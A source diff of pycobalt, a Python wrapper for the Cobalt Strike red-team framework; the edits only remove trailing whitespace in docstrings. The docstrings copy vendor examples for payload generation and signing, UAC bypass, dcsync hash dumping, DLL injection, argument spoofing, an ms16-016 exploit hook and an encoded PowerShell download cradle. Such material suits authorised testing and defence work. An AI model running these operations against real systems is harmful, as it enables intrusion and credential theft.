@@ -10,12 +10,12 @@ import pycobalt.engine as engine
 def is64(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Check if a session is on an x64 system or not (Beacon only).
         Arguments
         $1 - Beacon/Session ID
         Example
-        
+
         command x64 {
             foreach $session (beacons()) {
                 if (-is64 $session['id']) {
@@ -23,7 +23,7 @@ def is64(*args, fork=False):
                 }
             }
         }
-        
+
     """
 
     return engine.call('-is64', args, fork=fork)
@@ -32,12 +32,12 @@ def is64(*args, fork=False):
 def isadmin(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Check if a session has admin rights
         Arguments
         $1 - Beacon/Session ID
         Example
-        
+
         command admin_sessions {
             foreach $session (beacons()) {
                 if (-isadmin $session['id']) {
@@ -45,7 +45,7 @@ def isadmin(*args, fork=False):
                 }
             }
         }
-        
+
     """
 
     return engine.call('-isadmin', args, fork=fork)
@@ -54,12 +54,12 @@ def isadmin(*args, fork=False):
 def isbeacon(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Check if a session is a Beacon or not.
         Arguments
         $1 - Beacon/Session ID
         Example
-        
+
         command beacons {
             foreach $session (beacons()) {
                 if (-isbeacon $session['id']) {
@@ -67,7 +67,7 @@ def isbeacon(*args, fork=False):
                 }
             }
         }
-        
+
     """
 
     return engine.call('-isbeacon', args, fork=fork)
@@ -76,12 +76,12 @@ def isbeacon(*args, fork=False):
 def isssh(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Check if a session is an SSH session or not.
         Arguments
         $1 - Beacon/Session ID
         Example
-        
+
         command ssh_sessions {
             foreach $session (beacons()) {
                 if (-isssh $session['id']) {
@@ -89,7 +89,7 @@ def isssh(*args, fork=False):
                 }
             }
         }
-        
+
     """
 
     return engine.call('-isssh', args, fork=fork)
@@ -98,14 +98,14 @@ def isssh(*args, fork=False):
 def action(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Post a public action message to the event log. This is similar to the /me command.
         Arguments
         $1 - the message
         Example
-        
+
         action("dances!");
-        
+
     """
 
     return engine.call('action', args, fork=fork)
@@ -114,17 +114,17 @@ def action(*args, fork=False):
 def addTab(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         create a tab to display a GUI object.
         Arguments
         $1 - the title of the tab
         $2 - a GUI object. A GUI object is one that is an instance of javax.swing.JComponent.
         $3 - a tooltip to display when a user hovers over this tab.
         Example
-        
+
         $label = [new javax.swing.JLabel: "Hello World"];
         addTab("Hello!", $label, "this is an example");
-        
+
     """
 
     return engine.call('addTab', args, fork=fork)
@@ -133,19 +133,19 @@ def addTab(*args, fork=False):
 def addVisualization(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Register a visualization with Cobalt Strike.
         Arguments
         $1 - the name of the visualization
         $2 - a javax.swing.JComponent object
         Example
-        
+
         $label = [new javax.swing.JLabel: "Hello World!"];
         addVisualization("Hello World", $label);
-        
+
         See Also
         &showVisualization
-        
+
     """
 
     return engine.call('addVisualization', args, fork=fork)
@@ -154,14 +154,14 @@ def addVisualization(*args, fork=False):
 def add_to_clipboard(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Add text to the clipboard, notify the user.
         Arguments
         $1 - the text to add to the clipboard
         Example
-        
+
         add_to_clipboard("Paste me you fool!");
-        
+
     """
 
     return engine.call('add_to_clipboard', args, fork=fork)
@@ -170,17 +170,17 @@ def add_to_clipboard(*args, fork=False):
 def alias(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Creates an alias command in the Beacon console
         Arguments
         $1 - the alias name to bind to
         $2 - a callback function. Called when the user runs the alias. Arguments are: $0 = command run, $1 = beacon id, $2 = arguments.
         Example
-        
+
         alias("foo", {
             btask($1, "foo!");
         });
-        
+
     """
 
     return engine.call('alias', args, fork=fork)
@@ -189,14 +189,14 @@ def alias(*args, fork=False):
 def applications(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Returns a list of application information in Cobalt Strike's data model. These applications are results from the System Profiler.
         Returns
         An array of dictionary objects with information about each application.
         Example
-        
+
         printAll(applications());
-        
+
     """
 
     return engine.call('applications', args, fork=fork)
@@ -205,16 +205,16 @@ def applications(*args, fork=False):
 def archives(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Returns a massive list of archived information about your activity from Cobalt Strike's data model. This information is leaned on heavily to reconstruct your activity timeline in Cobalt Strike's reports.
         Returns
         An array of dictionary objects with information about your team's activity.
         Example
-        
+
         foreach $index => $entry (archives()) {
             println("\c3( $+ $index $+ )\o $entry");
         }
-        
+
     """
 
     return engine.call('archives', args, fork=fork)
@@ -223,59 +223,59 @@ def archives(*args, fork=False):
 def artifact(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Generates an artifact (exe, dll) from a Cobalt Strike listener
         Arguments
         $1 - the listener name
         $2 - the artifact type
         $3 - true/false: is this shellcode destined for a remote target?
         $4 - x86|x64 - the architecture of the generated stager
-        
-        
+
+
         Type
         Description
-        
-        
+
+
         dll
         an x86 DLL
-        
-        
+
+
         dllx64
         an x64 DLL
-        
-        
+
+
         exe
         a plain executable
-        
-        
+
+
         powershell
         a powershell script
-        
-        
+
+
         python
         a python script
-        
-        
+
+
         svcexe
         a service executable
-        
-        
+
+
         vbscript
         a Visual Basic script
-        
-        
+
+
         Notes
         Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.
         Returns
         A scalar containing the specified artifact.
         Example
-        
+
         $data = artifact("my listener", "exe");
-        
+
         $handle = openf(">out.exe");
         writeb($handle, $data);
         closef($handle);
-        
+
     """
 
     return engine.call('artifact', args, fork=fork)
@@ -284,7 +284,7 @@ def artifact(*args, fork=False):
 def artifact_sign(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Sign an EXE or DLL file
         Arguments
         $1 - the contents of the EXE or DLL file to sign
@@ -294,18 +294,18 @@ def artifact_sign(*args, fork=False):
         Returns
         A scalar containing the signed artifact.
         Example
-        
+
         # generate an artifact!
         $data = artifact("my listener", "exe");
-        
+
         # sign it.
         $data = artifact_sign($data);
-        
+
         # save it
         $handle = openf(">out.exe");
         writeb($handle, $data);
         closef($handle);
-        
+
     """
 
     return engine.call('artifact_sign', args, fork=fork)
@@ -314,7 +314,7 @@ def artifact_sign(*args, fork=False):
 def artifact_stageless(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Generates a stageless artifact (exe, dll) from a (local) Cobalt Strike listener
         Arguments
         $1 - the listener name (must be local to this team server)
@@ -322,51 +322,51 @@ def artifact_stageless(*args, fork=False):
         $3 - x86|x64 - the architecture of the generated stager
         $4 - proxy configuration string
         $5 - callback function. This function is called when the artifact is ready. The $1 argument is the stageless content.
-        
-        
+
+
         Type
         Description
-        
-        
+
+
         dll
         an x86 DLL
-        
-        
+
+
         dllx64
         an x64 DLL
-        
-        
+
+
         exe
         a plain executable
-        
-        
+
+
         powershell
         a powershell script
-        
-        
+
+
         raw
         raw payload stage
-        
-        
+
+
         svcexe
         a service executable
-        
-        
+
+
         Notes
         1. This function provides the stageless artifact via a callback function. This is necessary because Cobalt Strike generates payload stages on the team server.
         2. The proxy configuration string is the same string you would use with Attacks -> Packages -> Windows Executable (S). *direct* ignores the local proxy configuration and attempts a direct connection. protocol://user:password@host:port specifies which proxy configuration the artifact should use. The username and password are optional (e.g., protocol://host:port is fine). The acceptable protocols are socks and http. Set the proxy configuration string to $null or "" to use the default behavior. Custom dialogs may use &drow_proxyserver to set this.
         3. This function cannot generate artifacts for listeners on other team servers. This function also cannot generate artifacts for foreign listeners. Limit your use of this function to local listers with stages only. Custom dialogs may use &drow_listener_stage to choose an acceptable listener for this function.
         Example
-        
+
         sub ready {
             local('$handle');
             $handle = openf(">out.exe");
             writeb($handle, $1);
             closef($handle);
         }
-        
+
         artifact_stageless("my listener", "exe", "x86", "", &ready);
-        
+
     """
 
     return engine.call('artifact_stageless', args, fork=fork)
@@ -375,7 +375,7 @@ def artifact_stageless(*args, fork=False):
 def bargue_add(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         This function adds an option to Beacon's list of commands to spoof arguments for.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
@@ -386,13 +386,13 @@ def bargue_add(*args, fork=False):
         x86 Beacon can only spoof arguments in x86 child processes. Likewise, x64 Beacon can only spoof arguments in x64 child processes.
         The real arguments are written to the memory space that holds the fake arguments. If the real arguments are longer than the fake arguments, the command launch will fail.
         Example
-        
+
         # spoof cmd.exe arguments.
         bargue_add($1, "%COMSPEC%", "/K \"cd c:\windows\temp & startupdatenow.bat\"");
-        
+
         # spoof net arguments
         bargue_add($1, "net", "user guest /active:no");
-        
+
     """
 
     return engine.call('bargue_add', args, fork=fork)
@@ -401,14 +401,14 @@ def bargue_add(*args, fork=False):
 def bargue_list(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         List the commands + fake arguments Beacon will spoof arguments for.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         Example
-        
+
         bargue_list($1);
-        
+
     """
 
     return engine.call('bargue_list', args, fork=fork)
@@ -417,16 +417,16 @@ def bargue_list(*args, fork=False):
 def bargue_remove(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         This function removes an option to Beacon's list of commands to spoof arguments for.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the command to spoof arguments for. Environment variables are OK here too.
         Example
-        
+
         # don't spoof cmd.exe
         bargue_remove($1, "%COMSPEC%");
-        
+
     """
 
     return engine.call('bargue_remove', args, fork=fork)
@@ -435,16 +435,16 @@ def bargue_remove(*args, fork=False):
 def base64_decode(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Unwrap a base64-encoded string
         Arguments
         $1 - the string to decode
         Returns
         The argument processed by a base64 decoder
         Example
-        
+
         println(base64_decode(base64_encode("this is a test")));
-        
+
     """
 
     return engine.call('base64_decode', args, fork=fork)
@@ -453,16 +453,16 @@ def base64_decode(*args, fork=False):
 def base64_encode(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Base64 encode a string
         Arguments
         $1 - the string to encode
         Returns
         The argument processed by a base64 encoder
         Example
-        
+
         println(base64_encode("this is a test"));
-        
+
     """
 
     return engine.call('base64_encode', args, fork=fork)
@@ -471,17 +471,17 @@ def base64_encode(*args, fork=False):
 def bbrowser(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Generate the beacon browser GUI component. Shows only Beacons.
         Returns
         The beacon browser GUI object (a javax.swing.JComponent)
         Example
-        
+
         addVisualization("Beacon Browser", bbrowser());
-        
+
         See Also
         &showVisualization
-        
+
     """
 
     return engine.call('bbrowser', args, fork=fork)
@@ -490,16 +490,16 @@ def bbrowser(*args, fork=False):
 def bbrowserpivot(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Start a Browser Pivot
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the PID to inject the browser pivot agent into.
         $3 - the architecture of the target PID (x86|x64)
         Example
-        
+
         bbrowserpivot($1, 1234, "x86");
-        
+
     """
 
     return engine.call('bbrowserpivot', args, fork=fork)
@@ -508,14 +508,14 @@ def bbrowserpivot(*args, fork=False):
 def bbrowserpivot_stop(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Stop a Browser Pivot
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         Example
-        
+
         bbrowserpivot_stop($1);
-        
+
     """
 
     return engine.call('bbrowserpivot_stop', args, fork=fork)
@@ -524,20 +524,20 @@ def bbrowserpivot_stop(*args, fork=False):
 def bbypassuac(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Run the bypass UAC attack.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the listener to target.
         Example
-        
+
         item "&Bypass UAC" {
             openPayloadHelper(lambda({
                 binput($bids, "bypassuac $1");
                 bbypassuac($bids, $1);
             }, $bids => $1));
         }
-        
+
     """
 
     return engine.call('bbypassuac', args, fork=fork)
@@ -546,17 +546,17 @@ def bbypassuac(*args, fork=False):
 def bcancel(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Cancel a file download
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the file to cancel or a wildcard.
         Example
-        
+
         item "&Cancel Downloads" {
             bcancel($1, "*");
         }
-        
+
     """
 
     return engine.call('bcancel', args, fork=fork)
@@ -565,19 +565,19 @@ def bcancel(*args, fork=False):
 def bcd(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask a Beacon to change it's current working directory.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the folder to change to.
         Example
-        
+
         # create a command to change to the user's home directory
         alias home {
             $home = "c:\\users\\" . binfo($1, "user");
             bcd($1, $home);
         }
-        
+
     """
 
     return engine.call('bcd', args, fork=fork)
@@ -586,17 +586,17 @@ def bcd(*args, fork=False):
 def bcheckin(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask a Beacon to checkin. This is basically a no-op for Beacon.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         Example
-        
+
         item "&Checkin" {
             binput($1, "checkin");
             bcheckin($1);
         }
-        
+
     """
 
     return engine.call('bcheckin', args, fork=fork)
@@ -605,14 +605,14 @@ def bcheckin(*args, fork=False):
 def bclear(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         This is the "oops" command. It clears the queued tasks for the specified beacon.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         Example
-        
+
         bclear($1);
-        
+
     """
 
     return engine.call('bclear', args, fork=fork)
@@ -621,15 +621,15 @@ def bclear(*args, fork=False):
 def bconnect(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon (or SSH session) to connect to a Beacon peer over a TCP socket
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the target to connect to
         Example
-        
+
         bconnect($1, "DC");
-        
+
     """
 
     return engine.call('bconnect', args, fork=fork)
@@ -638,7 +638,7 @@ def bconnect(*args, fork=False):
 def bcovertvpn(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to deploy a Covert VPN client.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
@@ -646,9 +646,9 @@ def bcovertvpn(*args, fork=False):
         $3 - the IP address of the interface [on target] to bridge into
         $4 - [optional] the MAC address of the Covert VPN interface
         Example
-        
+
         bcovertvpn($1, "phear0", "172.16.48.18");
-        
+
     """
 
     return engine.call('bcovertvpn', args, fork=fork)
@@ -657,16 +657,16 @@ def bcovertvpn(*args, fork=False):
 def bcp(*args, silent=False, fork=False):
     r""""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to copy a file or folder.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the file or folder to copy
         $3 - the destination
         Example
-        
+
         bcp($1, "evil.exe", "\\\\target\\C$\\evil.exe");
-        
+
     """
 
     return engine.call('bcp', args, silent=silent, fork=fork)
@@ -675,16 +675,16 @@ def bcp(*args, silent=False, fork=False):
 def bdata(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Get metadata for a Beacon session.
         Arguments
         $1 - the id for the beacon to pull metadata for
         Returns
         A dictionary object with metadata about the Beacon session.
         Example
-        
+
         println(bdata("1234"));
-        
+
     """
 
     return engine.call('bdata', args, fork=fork)
@@ -693,7 +693,7 @@ def bdata(*args, fork=False):
 def bdcsync(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Use mimikatz's dcsync command to pull a user's password hash from a domain controller.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
@@ -702,13 +702,13 @@ def bdcsync(*args, fork=False):
         Notes
         If $3 is left out, dcsync will dump all domain hashes.
         Example
-        
+
         # dump a specific account
         bdcsync($1, "PLAYLAND.testlab", "PLAYLAND\\Administrator");
-        
+
         # dump all accounts
         bdcsync($1, "PLAYLAND.testlab");
-        
+
     """
 
     return engine.call('bdcsync', args, fork=fork)
@@ -717,16 +717,16 @@ def bdcsync(*args, fork=False):
 def bdesktop(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Start a VNC session.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         Example
-        
+
         item "&Desktop (VNC)" {
             bdesktop($1);
         }
-        
+
     """
 
     return engine.call('bdesktop', args, fork=fork)
@@ -735,16 +735,16 @@ def bdesktop(*args, fork=False):
 def bdllinject(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Inject a Reflective DLL into a process.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the PID to inject the DLL into
         $3 - the local path to the Reflective DLL
         Example
-        
+
         bdllinject($1, 1234, script_resource("test.dll"));
-        
+
     """
 
     return engine.call('bdllinject', args, fork=fork)
@@ -753,7 +753,7 @@ def bdllinject(*args, fork=False):
 def bdllload(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Call LoadLibrary() in a remote process with the specified DLL.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
@@ -762,9 +762,9 @@ def bdllload(*args, fork=False):
         Notes
         The DLL must be the same architecture as the target process.
         Example
-        
+
         bdllload($1, 1234, "c:\\windows\\mystuff.dll");
-        
+
     """
 
     return engine.call('bdllload', args, fork=fork)
@@ -773,7 +773,7 @@ def bdllload(*args, fork=False):
 def bdllspawn(*args, silent=False, fork=False):
     r""""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Spawn a Reflective DLL as a Beacon post-exploitation job.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
@@ -791,7 +791,7 @@ def bdllspawn(*args, silent=False, fork=False):
         4. Calls ExitProcess(0) when done. This kills the spawned process to host the capability.
         Example (ReflectiveDll.c)
         This example is based on Stephen Fewer's Reflective DLL Injection Project:
-        
+
         BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved ) {
             BOOL bReturnValue = TRUE;
             switch( dwReason ) {
@@ -801,7 +801,7 @@ def bdllspawn(*args, silent=False, fork=False):
                     break;
                 case DLL_PROCESS_ATTACH:
                     hAppInstance = hinstDLL;
-        
+
                     /* print some output to the operator */
                     if (lpReserved != NULL) {
                         printf("Hello from test.dll. Parameter is '%s'\n", (char *)lpReserved);
@@ -809,10 +809,10 @@ def bdllspawn(*args, silent=False, fork=False):
                     else {
                         printf("Hello from test.dll. There is no parameter\n");
                     }
-        
+
                     /* flush STDOUT */
                     fflush(stdout);
-        
+
                     /* we're done, so let's exit */
                     ExitProcess(0);
                     break;
@@ -823,13 +823,13 @@ def bdllspawn(*args, silent=False, fork=False):
             }
             return bReturnValue;
         }
-        
+
         Example (Aggressor Script)
-        
+
         alias hello {
             bdllspawn($1, script_resource("reflective_dll.dll"), $2, "test dll", 5000, false);
         }
-        
+
     """
 
     return engine.call('bdllspawn', args, silent=silent, fork=fork)
@@ -838,15 +838,15 @@ def bdllspawn(*args, silent=False, fork=False):
 def bdownload(*args, silent=False, fork=False):
     r""""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask a Beacon to download a file
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the file to request
         Example
-        
+
         bdownload($1, "c:\\sysprep.inf");
-        
+
     """
 
     return engine.call('bdownload', args, silent=silent, fork=fork)
@@ -855,17 +855,17 @@ def bdownload(*args, silent=False, fork=False):
 def bdrives(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to list the drives on the compromised system
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         Example
-        
+
         item "&Drives" {
             binput($1, "drives");
             bdrives($1);
         }
-        
+
     """
 
     return engine.call('bdrives', args, fork=fork)
@@ -874,16 +874,16 @@ def bdrives(*args, fork=False):
 def beacon_command_describe(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Describe a Beacon command.
         Returns
         A string description of the Beacon command.
         Arguments
         $1 - the command
         Example
-        
+
         println(beacon_command_describe("ls"));
-        
+
     """
 
     return engine.call('beacon_command_describe', args, fork=fork)
@@ -892,16 +892,16 @@ def beacon_command_describe(*args, fork=False):
 def beacon_command_detail(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Get the help information for a Beacon command.
         Returns
         A string with helpful information about a Beacon command.
         Arguments
         $1 - the command
         Example
-        
+
         println(beacon_command_detail("ls"));
-        
+
     """
 
     return engine.call('beacon_command_detail', args, fork=fork)
@@ -910,23 +910,23 @@ def beacon_command_detail(*args, fork=False):
 def beacon_command_register(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Register help information for a Beacon command.
         Arguments
         $1 - the command
         $2 - the short description of the command
         $3 - the long-form help for the command.
         Example
-        
+
         alis echo {
             blog($1, "You typed: " . substr($1, 5));
         }
-        
+
         beacon_command_register(
             "echo",
             "echo text to beacon log",
             "Synopsis: echo [arguments]\n\nLog arguments to the beacon console");
-        
+
     """
 
     return engine.call('beacon_command_register', args, fork=fork)
@@ -935,14 +935,14 @@ def beacon_command_register(*args, fork=False):
 def beacon_commands(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Get a list of Beacon commands.
         Returns
         An array of Beacon commands.
         Example
-        
+
         printAll(beacon_commands());
-        
+
     """
 
     return engine.call('beacon_commands', args, fork=fork)
@@ -951,16 +951,16 @@ def beacon_commands(*args, fork=False):
 def beacon_data(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Get metadata for a Beacon session.
         Arguments
         $1 - the id for the beacon to pull metadata for
         Returns
         A dictionary object with metadata about the Beacon session.
         Example
-        
+
         println(beacon_data("1234"));
-        
+
     """
 
     return engine.call('beacon_data', args, fork=fork)
@@ -969,7 +969,7 @@ def beacon_data(*args, fork=False):
 def beacon_execute_job(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Run a command and report its output to the user.
         Arguments
         $1 - the Beacon ID
@@ -977,19 +977,19 @@ def beacon_execute_job(*args, fork=False):
         $3 - the command arguments (environment variables are not resolved).
         $4 - flags that change how the job is launched (e.g., 1 = disable WOW64 file system redirection)
         Notes
-        
+
         The string $2 and $3 are combined as-is into a command line. Make sure you begin $3 with a space!
         This is the mechanism Cobalt Strike uses for its shell and powershell commands.
-        
+
         Example
-        
+
         alias shell {
             local('$args');
             $args = substr($0, 6);
             btask($1, "Tasked beacon to run: $args", "T1059");
             beacon_execute_job($1, "%COMSPEC%", " /C $args", 0);
         }
-        
+
     """
 
     return engine.call('beacon_execute_job', args, fork=fork)
@@ -998,16 +998,16 @@ def beacon_execute_job(*args, fork=False):
 def beacon_exploit_describe(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Describe a Beacon exploit
         Returns
         A string description of the Beacon exploit
         Arguments
         $1 - the exploit
         Example
-        
+
         println(beacon_exploit_describe("ms14-058"));
-        
+
         See Also
         &beacon_exploit_register, &beacon_exploits, &belevate
     """
@@ -1018,42 +1018,42 @@ def beacon_exploit_describe(*args, fork=False):
 def beacon_exploit_register(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Register a Beacon privilege escalation exploit with Cobalt Strike
         Arguments
         $1 - the exploit short name
         $2 - a description of the exploit
         $3 - the function that implements the exploit ($1 is the Beacon ID, $2 is the listener)
         Example
-        
+
         # Integrate windows/local/ms16_016_webdav from Metasploit
         # https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms16_016_webdav.rb
-        
+
         sub ms16_016_exploit {
             # check if we're on an x64 system and error out.
             if (-is64 $1) {
                 berror($1, "ms16-016 exploit is x86 only");
                 return;
             }
-        
+
             # acknowledge this command
             btask($1, "Task Beacon to run " . listener_describe($2) . " via ms16-016");
-        
+
             # generate our shellcode
             $stager = shellcode($2, false, "x86");
-        
+
             # spawn a Beacon post-ex job with the exploit DLL
             bdllspawn!($1, script_resource("modules/cve-2016-0051.x86.dll"), $stager, "ms16-016", 5000);
-        
+
             # stage our payload (if this is a bind payload)
             bstage($1, $null, $2, $arch);
         }
-        
+
         beacon_exploit_register("ms16-016", "mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)", &ms16_016_exploit);
-        
+
         See Also
         &beacon_exploit_describe, &beacon_exploits, &belevate
-        
+
     """
 
     return engine.call('beacon_exploit_register', args, fork=fork)
@@ -1062,17 +1062,17 @@ def beacon_exploit_register(*args, fork=False):
 def beacon_exploits(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Get a list of privilege escalation exploits registered with Cobalt Strike.
         Returns
         An array of Beacon exploits.
         Example
-        
+
         printAll(beacon_exploits());
-        
+
         See also
         &beacon_exploit_describe, &beacon_exploit_register, &belevate
-        
+
     """
 
     return engine.call('beacon_exploits', args, fork=fork)
@@ -1081,34 +1081,34 @@ def beacon_exploits(*args, fork=False):
 def beacon_host_imported_script(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Locally host a previously imported PowerShell script within Beacon and return a short script that will download and invoke this script.
         Arguments
         $1 - the id of the Beacon to host this script with.
         Returns
         A short PowerShell script to download and evaluate the previously script when run. How this one-liner is used is up to you!
         Example
-        
+
         alias powershell {
             local('$args $cradle $runme $cmd');
-        
+
             # $0 is the entire command with no parsing.
             $args   = substr($0, 11);
-        
+
             # generate the download cradle (if one exists) for an imported PowerShell script
             $cradle = beacon_host_imported_script($1);
-        
+
             # encode our download cradle AND cmdlet+args we want to run
             $runme  = base64_encode( str_encode($cradle . $args, "UTF-16LE") );
-        
+
             # Build up our entire command line.
             $cmd    = " -nop -exec bypass -EncodedCommand \" $+ $runme $+ \"";
-        
+
             # task Beacon to run all of this.
             btask($1, "Tasked beacon to run: $args", "T1086");
             beacon_execute_job($1, "powershell", $cmd, 1);
         }
-        
+
     """
 
     return engine.call('beacon_host_imported_script', args, fork=fork)
@@ -1117,7 +1117,7 @@ def beacon_host_imported_script(*args, fork=False):
 def beacon_host_script(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Locally host a PowerShell script within Beacon and return a short script that will download and invoke this script. This function is a way to run large scripts when there are constraints on the length of your PowerShell one-liner.
         Arguments
         $1 - the id of the Beacon to host this script with.
@@ -1125,16 +1125,16 @@ def beacon_host_script(*args, fork=False):
         Returns
         A short PowerShell script to download and evaluate the script when run. How this one-liner is used is up to you!
         Example
-        
+
         alias test {
             local('$script $hosted');
             $script = "2 + 2";
             $hosted = beacon_host_script($1, $script);
-        
+
             binput($1, "powerpick $hosted");
             bpowerpick($1, $hosted);
         }
-        
+
     """
 
     return engine.call('beacon_host_script', args, fork=fork)
@@ -1143,16 +1143,16 @@ def beacon_host_script(*args, fork=False):
 def beacon_ids(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Get the ID of all Beacons calling back to this Cobalt Strike team server.
         Returns
         An array of beacon IDs
         Example
-        
+
         foreach $bid (beacon_ids()) {
             println("Bid: $bid");
         }
-        
+
     """
 
     return engine.call('beacon_ids', args, fork=fork)
@@ -1161,7 +1161,7 @@ def beacon_ids(*args, fork=False):
 def beacon_info(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Get information from a Beacon session's metadata.
         Arguments
         $1 - the id for the beacon to pull metadata for
@@ -1169,10 +1169,10 @@ def beacon_info(*args, fork=False):
         Returns
         A string with the requested information.
         Example
-        
+
         println("User is: " . beacon_info("1234", "user"));
         println("PID  is: " . beacon_info("1234", "pid"));
-        
+
     """
 
     return engine.call('beacon_info', args, fork=fork)
@@ -1181,7 +1181,7 @@ def beacon_info(*args, fork=False):
 def beacon_remove(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Remove a Beacon from the display.
         Arguments
         $1 - the id for the beacon to remove
